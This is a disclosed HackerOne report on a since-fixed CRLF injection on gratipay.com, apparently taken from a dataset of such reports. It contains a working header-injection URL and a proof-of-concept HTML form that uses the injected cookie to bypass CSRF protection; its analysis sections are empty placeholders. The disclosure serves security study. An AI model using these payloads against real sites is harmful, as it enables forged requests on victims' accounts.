---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '79552'
original_report_id: '79552'
title: '[gratipay.com] CRLF Injection'
team_handle: gratipay
created_at: '2015-07-29T19:42:10.539Z'
disclosed_at: '2015-08-20T10:24:29.252Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
---

# [gratipay.com] CRLF Injection

## Metadata

- HackerOne Report ID: 79552
- Weakness: 
- Program: gratipay
- Disclosed At: 2015-08-20T10:24:29.252Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

### CRLF Injection 
(Chrome, Internet Explorer)
```
http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

HTTP Response:
```
Location: https://gratipay.com/\r
Set-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;\r\n
```

### CSRF Protection Bypass via CRLF Injection
PoC:
```html
<form id="csrf" action="https://gratipay.com/~fickov/statement.json" method="POST"> 
<input type="hidden" name="lang" value="en" /> 
<input type="hidden" name="content" value="CSRF&#95;TEST" /> 
<input type="hidden" name="csrf&#95;token" value="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" /> 
<input type="submit" value="Submit request" /> 
</form> 
<img src="http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;" onerror="csrf.submit()">
```

This vulnerability has been fixed.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
